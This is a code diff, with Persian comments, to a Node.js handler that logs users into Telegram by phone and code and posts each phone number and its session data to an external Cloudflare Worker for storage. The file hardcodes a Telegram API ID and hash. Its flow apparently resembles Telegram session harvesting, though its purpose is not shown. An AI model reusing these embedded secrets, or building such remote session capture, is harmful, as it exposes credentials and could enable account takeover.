@@ -3,12 +3,15 @@ const { TelegramClient } = require("telegram");
 const { StringSession } = require("telegram/sessions");
 const { Api } = require("telegram/tl");
 
-// اطلاعات API - این مقادیر باید از my.telegram.org دریافت شوند
+// اطلاعات API
 const apiId = 20456083;
 const apiHash = '16db2b0cdd40db7c91511ca151115af5';
 
 // آدرس Cloudflare Worker
 const WORKER_URL = "https://tell.a09627301.workers.dev";
+
+// ذخیره sessionها - در محیط production از دیتابیس استفاده کنید
+const sessions = {};
 
 module.exports = async (req, res) => {
   // تنظیم هدر برای CORS
@@ -65,14 +68,18 @@ module.exports = async (req, res) => {
       return res.status(400).json({ success: false, message: "شماره تلفن لازم است" });
     }
 
-    // ایجاد کلاینت تلگرام
-    const stringSession = new StringSession("");
-    const client = new TelegramClient(stringSession, apiId, apiHash, {
-      connectionRetries: 5,
-    });
-    
-    // اتصال کلاینت
-    await client.connect();
+    // اگر session برای این شماره وجود ندارد، ایجاد کن
+    if (!sessions[phone]) {
+      const stringSession = new StringSession("");
+      sessions[phone] = new TelegramClient(stringSession, apiId, apiHash, {
+        connectionRetries: 5,
+      });
+      
+      // اتصال کلاینت
+      await sessions[phone].connect();
+    }
+
+    const client = sessions[phone];
 
     if (step === "sendCode") {
       try {
@@ -129,11 +136,10 @@ module.exports = async (req, res) => {
         
         // ذخیره session در Cloudflare D1
         try {
-          const response = await fetch(`${WORKER_URL}/api/login`, {
+          const response = await fetch(`${WORKER_URL}/api/save-session`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
-              step: "saveSession", 
               phone, 
               userData 
             })
@@ -206,11 +212,10 @@ module.exports = async (req, res) => {
         
         // ذخیره session در Cloudflare D1
         try {
-          const response = await fetch(`${WORKER_URL}/api/login`, {
+          const response = await fetch(`${WORKER_URL}/api/save-session`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
-              step: "saveSession", 
               phone, 
               userData 
             })
